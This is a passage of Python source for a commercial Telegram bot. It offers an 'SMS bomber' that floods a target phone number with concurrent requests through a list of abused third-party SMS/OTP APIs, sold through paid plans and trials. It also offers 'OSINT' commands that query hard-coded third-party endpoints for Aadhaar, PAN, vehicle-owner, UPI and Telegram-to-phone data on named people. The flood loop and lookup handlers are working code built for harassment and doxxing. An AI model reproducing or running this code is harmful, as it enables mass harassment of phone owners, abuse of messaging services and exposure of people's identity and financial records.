        is_active BOOLEAN DEFAULT 1
    )
    ''')

    # Logs
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attack_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_number TEXT,
            duration_seconds INTEGER,
            requests_sent INTEGER,
            status TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Settings (For OSINT APIs)
    cursor.execute('CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)')

    # Default OSINT APIs
    default_apis = {
        'api_global': 'http://erox.shop/numapi.php?mobile={number}&key=KRISH',
        'api_aadhaar': 'https://adhaar.khna04221.workers.dev/?aadhaar={number}',
        'api_pak': 'https://paknum.amorinthz.workers.dev/?key=AMORINTH&number={number}',
        'api_pan': 'https://pan.amorinthz.workers.dev/?key=AMORINTH&pan={number}',
        'api_vehicle': 'https://api-ij32.onrender.com/vehicle?text={number}',
        'api_vehicle_num': 'http://subhxcosmo-osint-api.onrender.com/api?key=CRUEL&type=vehicle_num&term={number}',
        'api_telegram': 'https://api.b77bf911.workers.dev/telegram?user={number}',
        'api_instagram': 'https://mediafire.m2hgamerz.workers.dev/api/instagram?username={number}',
        'api_fampay': 'https://api.b77bf911.workers.dev/upi2?id={number}',
        'api_ff': 'https://abbas-apis.vercel.app/api/ff-info?uid={number}',
        'api_email': 'https://abbas-apis.vercel.app/api/email?mail={number}',
        'api_tgtonum': 'https://tg-to-num-vishal.vercel.app/api/search?number={number}'
    }

    for key, url in default_apis.items():
        cursor.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', (key, url))
    
    conn.commit()
    conn.close()

# --- DB HELPERS ---
def get_api_url(service_key):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT value FROM settings WHERE key = ?', (service_key,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def set_api_url(service_key, new_url):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (service_key, new_url))
    conn.commit()
    conn.close()

def update_user_credits(user_id, credits_change, username="", first_name=""):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    if user:
        cursor.execute('UPDATE users SET credits = credits + ?, last_used = CURRENT_TIMESTAMP, username = COALESCE(?, username), first_name = COALESCE(?, first_name) WHERE user_id = ?', (credits_change, username, first_name, user_id))
    else:
        cursor.execute('INSERT INTO users (user_id, username, first_name, credits) VALUES (?, ?, ?, ?)', (user_id, username, first_name, 5 + credits_change))
    conn.commit()
    cursor.execute('SELECT credits FROM users WHERE user_id = ?', (user_id,))
    try: new_credits = cursor.fetchone()[0]
    except: new_credits = 0
    conn.close()
    return new_credits

def get_user_credits(user_id):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT credits FROM users WHERE user_id = ?', (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res[0] if res else 0

def check_and_claim_bonus(user_id):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT last_bonus, credits FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    current_time = datetime.now()
    if not result:
        conn.close()
        return False, "User not found."
    last_bonus_str = result[0]
    if last_bonus_str:
        last_bonus_time = datetime.fromisoformat(last_bonus_str)
        time_diff = current_time - last_bonus_time
        if time_diff < timedelta(hours=24):
            conn.close()
            remaining = timedelta(hours=24) - time_diff
            hours, remainder = divmod(remaining.seconds, 3600)
            minutes, _ = divmod(remainder, 60)
            return False, f"⏳ <b>Wait:</b> {hours}h {minutes}m"
    cursor.execute('UPDATE users SET credits = credits + 2, last_bonus = ? WHERE user_id = ?', (current_time.isoformat(), user_id))
    conn.commit()
    cursor.execute('SELECT credits FROM users WHERE user_id = ?', (user_id,))
    new_balance = cursor.fetchone()[0]
    conn.close()
    return True, new_balance

def get_all_users():
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM users')
    users = [row[0] for row in cursor.fetchall()]
    conn.close()
    return users

def get_bomber_status(user_id):
    """Check bomber status and handle expiration."""
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT is_paid_bomber, bomber_trial_used, bomber_expire_date FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if not result:
        update_user_credits(user_id, 0)
        conn.close()
        return False, False
        
    is_paid = bool(result[0])
    trial_used = bool(result[1])
    expire_date_str = result[2]
    
    # Check if subscription expired
    if is_paid and expire_date_str:
        expire_date = datetime.fromisoformat(expire_date_str)
        if datetime.now() > expire_date:
            cursor.execute('UPDATE users SET is_paid_bomber = 0 WHERE user_id = ?', (user_id,))
            conn.commit()
            is_paid = False
    
    conn.close()
    return is_paid, trial_used

def mark_trial_used(user_id):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET bomber_trial_used = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def log_attack_db(user_id, phone, duration, requests_sent, status):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('INSERT INTO attack_logs (user_id, target_number, duration_seconds, requests_sent, status) VALUES (?, ?, ?, ?, ?)', (user_id, phone, duration, requests_sent, status))
    conn.commit()
    conn.close()

def set_paid_bomber(user_id, status: bool, days: int = 0):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    # Ensure user exists first
    cursor.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
    if not cursor.fetchone():
        cursor.execute('INSERT INTO users (user_id, credits) VALUES (?, ?)', (user_id, 0))
    
    expiry_str = None
    if status and days > 0:
        expiry_date = datetime.now() + timedelta(days=days)
        expiry_str = expiry_date.isoformat()
    
    cursor.execute('UPDATE users SET is_paid_bomber = ?, bomber_expire_date = ? WHERE user_id = ?', (1 if status else 0, expiry_str, user_id))
    conn.commit()
    conn.close()

# --- NEW: GROUP CREDITS FUNCTIONS ---
def add_group_credits(group_id: int, credits: int, group_name: str = "", added_by: int = 0):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT credits FROM group_credits WHERE group_id = ?', (group_id,))
    result = cursor.fetchone()
    
    if result:
        cursor.execute('UPDATE group_credits SET credits = credits + ?, group_name = COALESCE(?, group_name), added_by = ? WHERE group_id = ?', 
                      (credits, group_name, added_by, group_id))
    else:
        cursor.execute('INSERT INTO group_credits (group_id, group_name, credits, added_by) VALUES (?, ?, ?, ?)',
                      (group_id, group_name, credits, added_by))
    
    conn.commit()
    conn.close()

def remove_group_credits(group_id: int, credits: int):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE group_credits SET credits = MAX(0, credits - ?) WHERE group_id = ?', (credits, group_id))
    conn.commit()
    conn.close()

def get_group_credits(group_id: int):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT credits FROM group_credits WHERE group_id = ?', (group_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else 0

def add_user_to_group(user_id: int, group_id: int):
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO group_members (user_id, group_id) VALUES (?, ?)', (user_id, group_id))
    conn.commit()
    conn.close()

def check_group_credit_for_user(user_id: int, group_id: int = None):
    """Check if user has group credits in any group they're part of"""
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    
    if group_id:
        # Check specific group
        cursor.execute('''
            SELECT SUM(gc.credits) FROM group_credits gc
            JOIN group_members gm ON gc.group_id = gm.group_id
            WHERE gm.user_id = ? AND gc.group_id = ? AND gc.credits > 0
        ''', (user_id, group_id))
    else:
        # Check all groups user is part of
        cursor.execute('''
            SELECT SUM(gc.credits) FROM group_credits gc
            JOIN group_members gm ON gc.group_id = gm.group_id
            WHERE gm.user_id = ? AND gc.credits > 0
        ''', (user_id,))
    
    result = cursor.fetchone()
    conn.close()
    return result[0] if result and result[0] else 0

def use_group_credit(user_id: int, group_id: int = None):
    """Use 1 credit from user's group (takes from first available group)"""
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    
    if group_id:
        cursor.execute('''
            SELECT group_id, credits FROM group_credits 
            WHERE group_id = ? AND credits > 0
        ''', (group_id,))
    else:
        cursor.execute('''
            SELECT gc.group_id, gc.credits FROM group_credits gc
            JOIN group_members gm ON gc.group_id = gm.group_id
            WHERE gm.user_id = ? AND gc.credits > 0
            ORDER BY gc.credits DESC
            LIMIT 1
        ''', (user_id,))
    
    result = cursor.fetchone()
    
    if result:
        group_id = result[0]
        cursor.execute('UPDATE group_credits SET credits = credits - 1 WHERE group_id = ?', (group_id,))
        conn.commit()
        conn.close()
        return True
    
    conn.close()
    return False

def get_all_groups_with_credits():
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT group_id, group_name, credits FROM group_credits ORDER BY credits DESC')
    results = cursor.fetchall()
    conn.close()
    return results

# --- NEW: CUSTOM BOMBER API FUNCTIONS ---
def add_custom_bomber_api(api_data: dict, added_by: int):
    """Add a custom bomber API to database"""
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    
    # Extract data with defaults
    api_name = api_data.get('name', 'Custom API')
    api_url = api_data.get('url', '')
    api_method = api_data.get('method', 'POST')
    api_headers = json.dumps(api_data.get('headers', {}))
    api_data_str = str(api_data.get('data')) if api_data.get('data') else None
    api_count = api_data.get('count', 1)
    api_type = api_data.get('type', 'sms')
    
    cursor.execute('''
        INSERT INTO custom_bomber_apis 
        (api_name, api_url, api_method, api_headers, api_data, api_count, api_type, added_by)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (api_name, api_url, api_method, api_headers, api_data_str, api_count, api_type, added_by))
    
    api_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return api_id

def get_all_custom_apis(active_only=True):
    """Get all custom bomber APIs"""
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    
    if active_only:
        cursor.execute('SELECT * FROM custom_bomber_apis WHERE is_active = 1 ORDER BY added_date DESC')
    else:
        cursor.execute('SELECT * FROM custom_bomber_apis ORDER BY added_date DESC')
    
    columns = [description[0] for description in cursor.description]
    results = cursor.fetchall()
    conn.close()
    
    apis = []
    for row in results:
        api = dict(zip(columns, row))
        # Parse headers back to dict
        try:
            api['api_headers'] = json.loads(api['api_headers']) if api['api_headers'] else {}
        except:
            api['api_headers'] = {}
        apis.append(api)
    
    return apis

def update_custom_api_status(api_id: int, is_active: bool):
    """Enable/disable a custom API"""
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE custom_bomber_apis SET is_active = ? WHERE id = ?', (1 if is_active else 0, api_id))
    conn.commit()
    conn.close()

def delete_custom_api(api_id: int):
    """Delete a custom API"""
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM custom_bomber_apis WHERE id = ?', (api_id,))
    conn.commit()
    conn.close()

def rebuild_attack_apis():
    """Rebuild ATTACK_APIS list from all sources"""
    global ATTACK_APIS, TOTAL_APIS
    
    # Saari APIs ko combine karo
    all_apis = []
    
    # 1. Pehle ORIGINAL BOMBER APIS (111 APIs)
    all_apis.extend(ORIGINAL_BOMBER_APIS)
    
    # 2. APIS.PY APIs (100+ APIs)
    all_apis.extend(APIS_PY_APIS)
    
    # 3. Custom APIs from database
    custom_apis = get_all_custom_apis(active_only=True)
    for api in custom_apis:
        api_dict = {
            "url": api['api_url'],
            "method": api['api_method'],
            "headers": api.get('api_headers', {}),
            "count": api.get('api_count', 1),
            "name": api.get('api_name', 'Custom API'),
            "data": None  # Lambda functions store nahi ho paati
        }
        all_apis.append(api_dict)
    
    # Duplicate URLs hatao (optional)
    unique_apis = []
    seen_urls = set()
    for api in all_apis:
        if api['url'] not in seen_urls:
            unique_apis.append(api)
            seen_urls.add(api['url'])
    
    ATTACK_APIS = unique_apis
    TOTAL_APIS = len(ATTACK_APIS)
    
    print(f"✅ Total APIs after merge: {TOTAL_APIS}")
    print(f"📊 ORIGINAL_BOMBER_APIS: {len(ORIGINAL_BOMBER_APIS)}")
    print(f"📊 APIS_PY_APIS: {len(APIS_PY_APIS)}")
    print(f"📊 Custom APIs: {len(custom_apis)}")
    
    return TOTAL_APIS

# Initialize ATTACK_APIS and TOTAL_APIS globally
ATTACK_APIS = []
TOTAL_APIS = 0

# --- KEYBOARDS ---
def get_main_keyboard():
    keyboard = [
        [KeyboardButton("💣 SMS BOMBER"), KeyboardButton("🔍 PHONE LOOKUP")],
        [KeyboardButton("🚗 VEHICLE LOOKUP"), KeyboardButton("🔢 VEHICLE TO NUM")],
        [KeyboardButton("🎮 FF LOOKUP"), KeyboardButton("📧 EMAIL LOOKUP")],
        [KeyboardButton("🇮🇳 AADHAAR LOOKUP"), KeyboardButton("🪪 PAN LOOKUP")],
        [KeyboardButton("📱 TELEGRAM LOOKUP"), KeyboardButton("📸 INSTAGRAM LOOKUP")],
        [KeyboardButton("💳 FAMPAY LOOKUP"), KeyboardButton("🆔 TG ID TO NUM")],
        [KeyboardButton("📊 MY CREDITS"), KeyboardButton("📈 DAILY BONUS")],
        [KeyboardButton("👑 OWNER")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("📢 BROADCAST", callback_data='admin_broadcast')],
        [InlineKeyboardButton("👥 GROUP CREDITS", callback_data='admin_group_credits')],
        [InlineKeyboardButton("➕ ADD GROUP CREDITS", callback_data='admin_add_group')],
        [InlineKeyboardButton("➖ REMOVE GROUP CREDITS", callback_data='admin_remove_group')],
        [InlineKeyboardButton("📋 GROUP LIST", callback_data='admin_list_groups')],
        [InlineKeyboardButton("⚙️ BOMBER APIs", callback_data='admin_bomber_apis')],
        [InlineKeyboardButton("➕ ADD CUSTOM API", callback_data='admin_add_bomber_api')],
        [InlineKeyboardButton("📋 CUSTOM APIs", callback_data='admin_list_custom_apis')],
        [InlineKeyboardButton("⚙️ OSINT APIs", callback_data='admin_apis')],
        [InlineKeyboardButton("💳 ADD CREDITS", callback_data='admin_add'), InlineKeyboardButton("💸 REMOVE CREDITS", callback_data='admin_remove')],
        [InlineKeyboardButton("➕ ADD PAID BOMBER", callback_data='admin_add_bomber'), InlineKeyboardButton("➖ REMOVE PAID BOMBER", callback_data='admin_remove_bomber')],
        [InlineKeyboardButton("📋 CREDITS LIST", callback_data='admin_all_credits'), InlineKeyboardButton("⏳ PAID LIST", callback_data='admin_paid_bombers')],
        [InlineKeyboardButton("🔄 REBUILD APIS", callback_data='admin_rebuild_apis')],
        [InlineKeyboardButton("🔙 EXIT", callback_data='back_main')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_api_selection_keyboard():
    keyboard = [
        [InlineKeyboardButton("GLOBAL API", callback_data='setapi_global'), InlineKeyboardButton("VEHICLE API", callback_data='setapi_vehicle')],
        [InlineKeyboardButton("VEHICLE2NUM", callback_data='setapi_vehicle_num'), InlineKeyboardButton("FF API", callback_data='setapi_ff')],
        [InlineKeyboardButton("EMAIL API", callback_data='setapi_email'), InlineKeyboardButton("AADHAAR API", callback_data='setapi_aadhaar')],
        [InlineKeyboardButton("PAN API", callback_data='setapi_pan'), InlineKeyboardButton("TELEGRAM API", callback_data='setapi_telegram')],
        [InlineKeyboardButton("INSTA API", callback_data='setapi_instagram'), InlineKeyboardButton("FAMPAY API", callback_data='setapi_fampay')],
        [InlineKeyboardButton("TG TO NUM API", callback_data='setapi_tgtonum')],
        [InlineKeyboardButton("🔙 BACK", callback_data='admin_panel')]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- API PARSING FUNCTION ---
def parse_api_from_text(text: str):
    """Parse any API format from text and convert to standard format"""
    try:
        # Try to parse as JSON first
        data = json.loads(text)
        if isinstance(data, dict):
            # Check if it's already in our format
            if 'url' in data:
                return data
            # Try to convert from common formats
            elif 'endpoint' in data:
                return {
                    'url': data['endpoint'],
                    'method': data.get('method', 'POST'),
                    'headers': data.get('headers', {}),
                    'data': data.get('body', data.get('data')),
                    'count': data.get('count', 1),
                    'name': data.get('name', 'Custom API'),
                    'type': data.get('type', 'sms')
                }
    except:
        pass
    
    # Try to parse as Python dict/list
    try:
        data = ast.literal_eval(text)
        if isinstance(data, dict):
            return data
        elif isinstance(data, list) and len(data) > 0:
            # Return first API if it's a list
            return data[0]
    except:
        pass
    
    # Try to parse as simple URL format
    lines = text.strip().split('\n')
    if len(lines) >= 1:
        url = lines[0].strip()
        if url.startswith(('http://', 'https://')):
            api_dict = {
                'url': url,
                'method': 'POST',
                'headers': {},
                'data': None,
                'count': 1,
                'name': 'Custom API',
                'type': 'sms'
            }
            
            # Try to find method
            for line in lines:
                if 'method' in line.lower():
                    if 'get' in line.lower():
                        api_dict['method'] = 'GET'
                    elif 'post' in line.lower():
                        api_dict['method'] = 'POST'
                
                # Try to find data
                if 'data' in line.lower() or 'body' in line.lower():
                    data_part = line.split(':', 1)[-1].strip()
                    if data_part:
                        api_dict['data'] = data_part
                
                # Try to find headers
                if 'header' in line.lower():
                    header_parts = line.split(':', 1)
                    if len(header_parts) > 1:
                        try:
                            headers = ast.literal_eval(header_parts[1].strip())
                            if isinstance(headers, dict):
                                api_dict['headers'] = headers
                        except:
                            pass
            
            return api_dict
    
    return None

# --- BOMBER ASYNC LOGIC ---
async def flash_api_call(session: aiohttp.ClientSession, api: dict, phone: str, context: ContextTypes.DEFAULT_TYPE):
    try:
        url = api['url'].format(phone=phone)
        data = api['data'](phone) if callable(api['data']) else api['data']
        headers = api.get('headers', {}).copy()
        
        # Ensure user-agent
        if 'User-Agent' not in headers:
            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

        if api['method'] == 'GET':
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(5)) as response:
                return response.status in [200, 201, 202, 204]
        elif api['method'] == 'POST':
            async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(5)) as response:
                return response.status in [200, 201, 202, 204]
    except: return False

async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str, duration: int, is_trial: bool = False):
    chat_id = context.user_data.get('status_chat_id')
    message_id = context.user_data.get('status_message_id')
    
    speed_level = 5 # Always max speed for Flash
    max_concurrent = SPEED_PRESETS[speed_level]['max_concurrent']
    
    connector = aiohttp.TCPConnector(limit=max_concurrent, limit_per_host=max_concurrent)
    async with aiohttp.ClientSession(connector=connector) as session:
        end_timestamp = time.time() + duration
        while time.time() < end_timestamp and context.user_data.get('attacking', False):
            remaining = end_timestamp - time.time()
            if remaining <= 0: break
            
            tasks = []
            for api in ATTACK_APIS:
                if not context.user_data.get('attacking', False): break
                for i in range(api.get('count', 1)):
                    if not context.user_data.get('attacking', False) or time.time() >= end_timestamp: break
                    tasks.append(asyncio.create_task(flash_api_call(session, api, phone, context)))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for res in results:
                    if res is True: context.user_data['successful_requests'] = context.user_data.get('successful_requests', 0) + 1
                    context.user_data['total_requests'] = context.user_data.get('total_requests', 0) + 1
            
            if time.time() - context.user_data.get('last_status_update', 0) >= 2:
                await update_flash_status(context, chat_id, message_id, phone, duration, is_trial)
                context.user_data['last_status_update'] = time.time()
            await asyncio.sleep(0.01)

    await update_flash_final_status(context, chat_id, message_id, phone, duration, is_trial)
    context.user_data['attacking'] = False
    log_attack_db(update.effective_user.id, phone, duration, context.user_data.get('total_requests', 0), "COMPLETED")

async def update_flash_status(context, chat_id, message_id, phone, duration, is_trial):
    if not context.user_data.get('attacking', False): return
    try:
        elapsed = int(time.time() - context.user_data['attack_start'].timestamp())
        total = context.user_data.get('total_requests', 0)
        success = context.user_data.get('successful_requests', 0)
        text = f"╔═══════════════════════╗\n║   ⚡ FLASH ATTACK ACTIVE  ║\n╚═══════════════════════╝\n🎯 Target: {phone}\n⏱️ Time: {elapsed}s / {duration}s\n⚡ Sent: {total}\n✅ Success: {success}\n🔥 Mode: FLASH (Level 5)\n🚀 APIs Loaded: {TOTAL_APIS}"
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text)
    except: pass

async def update_flash_final_status(context, chat_id, message_id, phone, duration, is_trial):
    try:
        total = context.user_data.get('total_requests', 0)
        success = context.user_data.get('successful_requests', 0)
        text = f"╔═══════════════════════╗\n║   ✅ ATTACK COMPLETED    ║\n╚═══════════════════════╝\n🎯 Target: {phone}\n⏱️ Duration: {duration}s\n⚡ Total Sent: {total}\n✅ Successful: {success}\n🔥 Status: FINISHED"
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text)
    except: pass

# --- OSINT LOGIC ---
async def handle_api_request(update, context, api_key, query, title):
    user_id = update.effective_user.id
    chat = update.effective_chat
    group_id = chat.id if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP] else None
    
    # Register user if not exists
    update_user_credits(user_id, 0, update.effective_user.username, update.effective_user.first_name)
    
    # Check personal credits first
    personal_credits = get_user_credits(user_id)
    
    # Check group credits if in group
    group_credits = 0
    if group_id:
        add_user_to_group(user_id, group_id)  # Register user in group
        group_credits = check_group_credit_for_user(user_id, group_id)
    
    total_credits = personal_credits + group_credits
    
    if total_credits < 1:
        await update.message.reply_text(
            "❌ <b>Low Credits!</b>\n\n"
            "You have no credits left.\n"
            "💳 Use daily bonus or contact @VILAXLORD.\n"
            "👥 Ask group admin to add group credits!",
            parse_mode=ParseMode.HTML
        )
        return

    msg = await update.message.reply_text(f"⏳ <b>SEARCHING {title}...</b>", parse_mode=ParseMode.HTML)

    api_url_template = get_api_url(api_key)
    if not api_url_template:
        await msg.edit_text(f"❌ API not configured for {title}.")
        return

    clean_query = query.strip() if any(x in api_key for x in ['email', 'insta', 'tgtonum']) else query.replace(' ', '').upper()
    
    try:
        def fetch():
            return requests.get(api_url_template.replace('{number}', clean_query), headers={'User-Agent': 'Mozilla/5.0'}, timeout=30, verify=False)
        
        response = await asyncio.to_thread(fetch)
        
        data = None
        if response.status_code == 200:
            try:
                raw = response.json()
                data = raw.get('result', raw.get('info', raw))
            except: pass
            
        data = clean_json(data)
        
        if not data:
            await msg.edit_text("❌ No data found.")
            return

        # Deduct credit from group first, then personal
        credit_deducted = False
        if group_credits > 0:
            if use_group_credit(user_id, group_id):
                credit_deducted = True
                new_credits = get_user_credits(user_id)
                group_credits_remaining = check_group_credit_for_user(user_id, group_id)
                credit_text = f"💰 Personal: {new_credits} | 👥 Group: {group_credits_remaining}"
            else:
                new_credits = update_user_credits(user_id, -1)
                credit_text = f"💰 Personal: {new_credits}"
        else:
            new_credits = update_user_credits(user_id, -1)
            credit_text = f"💰 Personal: {new_credits}"
        
        resp_text = format_response(title, clean_query, data, credit_text)
        await msg.edit_text(resp_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")

def clean_json(data):
    if not isinstance(data, dict): return data
    keys_to_remove = ['developer', 'credit', 'owner', 'status', 'success', 'code', 'msg', 'time']
    for k in keys_to_remove: 
        if k in data: del data[k]
    for k, v in list(data.items()): 
        if isinstance(v, (dict, list)): clean_json(v)
    return data if data else None

def format_response(title, target, data, credits_text):
    text = f"✅ <b>{title} RESULT</b>\n🎯: <code>{target}</code>\n━━━━━━━━━━━━━━━━━━\n"
    def dict_to_str(d, indent=0):
        s = ""
        if isinstance(d, dict):
            for k, v in d.items():
                if isinstance(v, (dict, list)):
                    s += f"\n<b>{k.upper()}:</b>" + dict_to_str(v, indent+1)
                else:
                    val_str = str(v)
                    if val_str.startswith(('http://', 'https://')):
                        display_val = f"<a href='{val_str}'>🔗 Link</a>"
                    else:
                        display_val = f"<code>{val_str}</code>"
                    s += f"\n{'  '*indent}🔸 <b>{k}:</b> {display_val}"
        elif isinstance(d, list):
            for item in d: s += dict_to_str(item, indent) + "\n---"
        return s
    
    body = dict_to_str(data)
    if len(body) > 3800: body = body[:3800] + "\n\n⚠️ <b>[TRUNCATED]</b>"
    return (text + body + f"\n━━━━━━━━━━━━━━━━━━\n{credits_text}")

# --- GROUP COMMAND HANDLERS ---
async def cmd_num(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /num [number]")
    await handle_api_request(update, context, 'api_global', context.args[0], 'Global Info')

async def cmd_ff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /ff [uid]")
    await handle_api_request(update, context, 'api_ff', context.args[0], 'Free Fire')

async def cmd_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /email [email]")
    await handle_api_request(update, context, 'api_email', context.args[0], 'Email Info')

async def cmd_vehicle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /vehicle [plate]")
    await handle_api_request(update, context, 'api_vehicle', context.args[0], 'Vehicle RC')

async def cmd_rctonum(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /rctonum [plate]")
    await handle_api_request(update, context, 'api_vehicle_num', context.args[0], 'RC to Mobile')

async def cmd_aadhaar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /aadhaar [number]")
    await handle_api_request(update, context, 'api_aadhaar', context.args[0], 'Aadhaar')

async def cmd_pan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /pan [number]")
    await handle_api_request(update, context, 'api_pan', context.args[0], 'PAN Card')

async def cmd_tg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /tg [id]")
    await handle_api_request(update, context, 'api_telegram', context.args[0], 'Telegram Info')

async def cmd_insta(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /insta [username]")
    await handle_api_request(update, context, 'api_instagram', context.args[0], 'Instagram')

async def cmd_fampay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /fampay [upi]")
    await handle_api_request(update, context, 'api_fampay', context.args[0], 'FamPay')

async def cmd_tgtonum(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("Usage: /tgtonum [id]")
    await handle_api_request(update, context, 'api_tgtonum', context.args[0], 'TG ID TO NUM')

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """
<b>🤖 AVAILABLE COMMANDS:</b>

/num [Phone] - Global Info
/ff [UID] - Free Fire Info
/email [Mail] - Email Info
/vehicle [Plate] - Vehicle RC
/rctonum [Plate] - RC to Mobile
/aadhaar [Num] - Aadhaar Info
/pan [Num] - PAN Info
/tg [ID] - Telegram Info
/insta [User] - Instagram Info
/fampay [UPI] - FamPay Info
/tgtonum [ID] - TG ID TO Number

<b>💣 BOMBER:</b>
/trial [Phone] - 60s Trial
/attack [Phone] [Time] - Paid Attack
/stop - Stop Attack
    """
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

# --- BOMBER COMMANDS ---
async def cmd_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args: return await update.message.reply_text("Usage: /trial <number>")
    is_paid, trial_used = get_bomber_status(user_id)
    if is_paid: return await update.message.reply_text("✅ You are a Paid User! Use /attack.")
    if trial_used: return await update.message.reply_text("❌ Trial Expired! Buy Paid Access\n\nDM TO BUY:- @VILAXLORD.")
    
    phone = context.args[0]
    if len(phone) != 10 or not phone.isdigit(): return await update.message.reply_text("❌ Invalid 10-digit number.")
    
    mark_trial_used(user_id)
    msg = await update.message.reply_text(f"🚀 <b>STARTING TRIAL FLASH ATTACK</b>\nTarget: {phone}\nTime: 60s", parse_mode=ParseMode.HTML)
    context.user_data.update({'attacking': True, 'status_chat_id': update.effective_chat.id, 'status_message_id': msg.message_id, 'attack_start': datetime.now(), 'total_requests': 0, 'successful_requests': 0})
    asyncio.create_task(run_flash_attack(update, context, phone, 60, is_trial=True))

async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_paid, _ = get_bomber_status(user_id)
    if not is_paid: return await update.message.reply_text("🔒 <b>PAID ONLY</b>\nContact Owner\n\nDM TO BUY:- @VILAXLORD.")
    if len(context.args) < 2: return await update.message.reply_text("Usage: /attack <number> <seconds>")
    
    phone, duration = context.args[0], int(context.args[1])
    if duration > 1500: duration = 1500
    if context.user_data.get('attacking'): return await update.message.reply_text("⚠️ Attack already running! Use /stop")
    
    msg = await update.message.reply_text(f"🚀 <b>STARTING FLASH ATTACK</b>\nTarget: {phone}\nTime: {duration}s", parse_mode=ParseMode.HTML)
    context.user_data.update({'attacking': True, 'status_chat_id': update.effective_chat.id, 'status_message_id': msg.message_id, 'attack_start': datetime.now(), 'total_requests': 0, 'successful_requests': 0})
    asyncio.create_task(run_flash_attack(update, context, phone, duration))

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('attacking'):
        context.user_data['attacking'] = False
        await update.message.reply_text("🛑 <b>ATTACK STOPPED</b>", parse_mode=ParseMode.HTML)
